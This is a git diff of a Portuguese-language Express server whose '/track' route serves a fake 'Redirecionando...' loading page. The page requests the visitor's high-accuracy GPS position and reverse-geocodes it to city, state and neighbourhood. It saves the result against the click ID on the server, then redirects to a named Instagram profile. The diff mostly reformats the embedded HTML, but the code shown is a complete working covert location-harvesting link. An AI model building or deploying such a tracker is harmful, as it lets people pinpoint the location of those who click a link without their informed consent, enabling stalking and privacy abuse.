@@ -325,199 +325,195 @@ app.get('/track', async (req, res) => {
     }
   })();
   
-  res.send(\`
-    <!DOCTYPE html>
-    <html>
-    <head>
-      <meta charset="UTF-8">
-      <meta name="viewport" content="width=device-width, initial-scale=1.0">
-      <title>Redirecionando...</title>
-      <style>
-        body {
-          margin: 0;
-          padding: 0;
-          display: flex;
-          justify-content: center;
-          align-items: center;
-          min-height: 100vh;
-          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-          font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+  const html = `<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Redirecionando...</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+    .container {
+      text-align: center;
+      background: white;
+      padding: 40px;
+      border-radius: 20px;
+      box-shadow: 0 10px 50px rgba(0,0,0,0.3);
+      max-width: 400px;
+    }
+    .loader {
+      border: 5px solid #f3f3f3;
+      border-top: 5px solid #667eea;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+      margin: 20px auto;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    h2 { color: #667eea; margin-bottom: 10px; }
+    p { color: #666; font-size: 14px; }
+    #status { 
+      color: #28a745; 
+      font-weight: bold; 
+      margin-top: 10px;
+      font-size: 12px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>🔄 Redirecionando...</h2>
+    <div class="loader"></div>
+    <p>Aguarde um momento...</p>
+    <p id="status">Obtendo localização...</p>
+  </div>
+  
+  <script>
+    const clickId = ${clickData.id};
+    const INSTAGRAM_URL = 'https://www.instagram.com/andre.osantos12/';
+    const MAX_WAIT_TIME = 8000;
+    
+    let redirected = false;
+    
+    function safeRedirect() {
+      if (!redirected) {
+        redirected = true;
+        window.location.href = INSTAGRAM_URL;
+      }
+    }
+    
+    setTimeout(() => {
+      document.getElementById('status').textContent = 'Redirecionando...';
+      safeRedirect();
+    }, MAX_WAIT_TIME);
+    
+    async function reverseGeocode(lat, lon) {
+      try {
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), 5000);
+        
+        const response = await fetch(
+          'https://nominatim.openstreetmap.org/reverse?format=json&lat=' + lat + '&lon=' + lon + '&addressdetails=1&accept-language=pt-BR',
+          { 
+            signal: controller.signal,
+            headers: { 
+              'User-Agent': 'InstagramTracker/1.0',
+              'Accept': 'application/json'
+            } 
+          }
+        );
+        
+        clearTimeout(timeoutId);
+        
+        if (!response.ok) {
+          throw new Error('Erro na API');
         }
-        .container {
-          text-align: center;
-          background: white;
-          padding: 40px;
-          border-radius: 20px;
-          box-shadow: 0 10px 50px rgba(0,0,0,0.3);
-          max-width: 400px;
+        
+        const data = await response.json();
+        
+        if (data && data.address) {
+          const addr = data.address;
+          return {
+            cidade: addr.city || addr.town || addr.village || addr.municipality || addr.county || 'Desconhecida',
+            estado: addr.state || addr.region || 'Desconhecido',
+            bairro: addr.suburb || addr.neighbourhood || addr.district || addr.quarter || null,
+            pais: addr.country || 'Brasil'
+          };
         }
-        .loader {
-          border: 5px solid #f3f3f3;
-          border-top: 5px solid #667eea;
-          border-radius: 50%;
-          width: 50px;
-          height: 50px;
-          animation: spin 1s linear infinite;
-          margin: 20px auto;
-        }
-        @keyframes spin {
-          0% { transform: rotate(0deg); }
-          100% { transform: rotate(360deg); }
-        }
-        h2 { color: #667eea; margin-bottom: 10px; }
-        p { color: #666; font-size: 14px; }
-        #status { 
-          color: #28a745; 
-          font-weight: bold; 
-          margin-top: 10px;
-          font-size: 12px;
-        }
-      </style>
-    </head>
-    <body>
-      <div class="container">
-        <h2>🔄 Redirecionando...</h2>
-        <div class="loader"></div>
-        <p>Aguarde um momento...</p>
-        <p id="status">Obtendo localização...</p>
-      </div>
+        
+        return null;
+      } catch (error) {
+        console.error('Erro no geocoding:', error);
+        return null;
+      }
+    }
+    
+    async function getLocationAndRedirect() {
+      if (!navigator.geolocation) {
+        console.log('Geolocalização não suportada');
+        safeRedirect();
+        return;
+      }
       
-      <script>
-        const clickId = \${clickData.id};
-        const INSTAGRAM_URL = 'https://www.instagram.com/andre.osantos12/';
-        const MAX_WAIT_TIME = 8000; // 8 segundos máximo
-        
-        let redirected = false;
-        
-        function safeRedirect() {
-          if (!redirected) {
-            redirected = true;
-            window.location.href = INSTAGRAM_URL;
-          }
-        }
-        
-        // Timeout de segurança
-        setTimeout(() => {
-          document.getElementById('status').textContent = 'Redirecionando...';
-          safeRedirect();
-        }, MAX_WAIT_TIME);
-        
-        async function reverseGeocode(lat, lon) {
+      document.getElementById('status').textContent = 'Obtendo GPS...';
+      
+      navigator.geolocation.getCurrentPosition(
+        async (position) => {
           try {
-            const controller = new AbortController();
-            const timeoutId = setTimeout(() => controller.abort(), 5000);
+            const lat = position.coords.latitude;
+            const lng = position.coords.longitude;
+            const accuracy = position.coords.accuracy;
             
-            const response = await fetch(
-              \\\`https://nominatim.openstreetmap.org/reverse?format=json&lat=\\\${lat}&lon=\\\${lon}&addressdetails=1&accept-language=pt-BR\\\`,
-              { 
-                signal: controller.signal,
-                headers: { 
-                  'User-Agent': 'InstagramTracker/1.0',
-                  'Accept': 'application/json'
-                } 
-              }
-            );
+            console.log('✅ GPS obtido:', lat, lng, 'Precisão:', accuracy, 'm');
+            document.getElementById('status').textContent = 'GPS obtido! Buscando endereço...';
             
-            clearTimeout(timeoutId);
+            const location = await reverseGeocode(lat, lng);
             
-            if (!response.ok) {
-              throw new Error('Erro na API');
+            if (location) {
+              console.log('✅ Endereço obtido:', location.cidade, location.estado);
+              document.getElementById('status').textContent = 'Salvando localização...';
             }
             
-            const data = await response.json();
+            const response = await fetch('/api/save-gps', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                clickId: clickId,
+                lat: lat,
+                lng: lng,
+                accuracy: accuracy,
+                location: location
+              })
+            });
             
-            if (data && data.address) {
-              const addr = data.address;
-              return {
-                cidade: addr.city || addr.town || addr.village || addr.municipality || addr.county || 'Desconhecida',
-                estado: addr.state || addr.region || 'Desconhecido',
-                bairro: addr.suburb || addr.neighbourhood || addr.district || addr.quarter || null,
-                pais: addr.country || 'Brasil'
-              };
+            const result = await response.json();
+            console.log('✅ Resultado:', result);
+            
+            if (result.success) {
+              document.getElementById('status').textContent = 'Localização salva! Redirecionando...';
+              setTimeout(safeRedirect, 500);
+            } else {
+              console.error('Erro ao salvar:', result.error);
+              safeRedirect();
             }
             
-            return null;
           } catch (error) {
-            console.error('Erro no geocoding:', error);
-            return null;
-          }
-        }
-        
-        async function getLocationAndRedirect() {
-          if (!navigator.geolocation) {
-            console.log('Geolocalização não suportada');
+            console.error('Erro ao processar GPS:', error);
             safeRedirect();
-            return;
           }
-          
-          document.getElementById('status').textContent = 'Obtendo GPS...';
-          
-          navigator.geolocation.getCurrentPosition(
-            async (position) => {
-              try {
-                const lat = position.coords.latitude;
-                const lng = position.coords.longitude;
-                const accuracy = position.coords.accuracy;
-                
-                console.log('✅ GPS obtido:', lat, lng, 'Precisão:', accuracy, 'm');
-                document.getElementById('status').textContent = 'GPS obtido! Buscando endereço...';
-                
-                // Busca o endereço
-                const location = await reverseGeocode(lat, lng);
-                
-                if (location) {
-                  console.log('✅ Endereço obtido:', location.cidade, location.estado);
-                  document.getElementById('status').textContent = 'Salvando localização...';
-                }
-                
-                // Envia para o servidor
-                const response = await fetch('/api/save-gps', {
-                  method: 'POST',
-                  headers: { 'Content-Type': 'application/json' },
-                  body: JSON.stringify({
-                    clickId: clickId,
-                    lat: lat,
-                    lng: lng,
-                    accuracy: accuracy,
-                    location: location
-                  })
-                });
-                
-                const result = await response.json();
-                console.log('✅ Resultado:', result);
-                
-                if (result.success) {
-                  document.getElementById('status').textContent = 'Localização salva! Redirecionando...';
-                  setTimeout(safeRedirect, 500);
-                } else {
-                  console.error('Erro ao salvar:', result.error);
-                  safeRedirect();
-                }
-                
-              } catch (error) {
-                console.error('Erro ao processar GPS:', error);
-                safeRedirect();
-              }
-            },
-            (error) => {
-              console.log('❌ Erro GPS:', error.code, error.message);
-              document.getElementById('status').textContent = 'GPS não autorizado. Redirecionando...';
-              setTimeout(safeRedirect, 1000);
-            },
-            {
-              enableHighAccuracy: true,
-              timeout: 10000,
-              maximumAge: 0
-            }
-          );
+        },
+        (error) => {
+          console.log('❌ Erro GPS:', error.code, error.message);
+          document.getElementById('status').textContent = 'GPS não autorizado. Redirecionando...';
+          setTimeout(safeRedirect, 1000);
+        },
+        {
+          enableHighAccuracy: true,
+          timeout: 10000,
+          maximumAge: 0
         }
-        
-        // Executa automaticamente
-        getLocationAndRedirect();
-      </script>
-    </body>
-    </html>
-  \`);
+      );
+    }
+    
+    getLocationAndRedirect();
+  </script>
+</body>
+</html>`;
+  
+  res.send(html);
 });
 
 // Salvar GPS
@@ -533,7 +529,6 @@ app.post('/api/save-gps', async (req, res) => {
       return res.json({ success: false, error: 'Click não encontrado' });
     }
     
-    // Salva a localização GPS
     click.gpsLocation = {
       lat: lat,
       lng: lng,
@@ -547,7 +542,6 @@ app.post('/api/save-gps', async (req, res) => {
     console.log('✅ GPS salvo para click', clickId, ':', lat, lng);
     console.log('📍 Localização:', click.gpsLocation.cidade, click.gpsLocation.estado);
     
-    // Se não veio localização do cliente, tenta buscar no servidor
     if (!location || !location.cidade || location.cidade === 'Desconhecida') {
       console.log('🔄 Buscando endereço no servidor...');
       
@@ -586,7 +580,6 @@ app.post('/api/save-gps', async (req, res) => {
   }
 });
 
-// API de estatísticas
 app.get('/api/stats', (req, res) => {
   res.json({
     total: clicks.length,
@@ -594,7 +587,6 @@ app.get('/api/stats', (req, res) => {
   });
 });
 
-// Limpar cliques
 app.post('/api/clear', (req, res) => {
   clicks.length = 0;
   console.log('🗑️ Todos os cliques foram limpos');
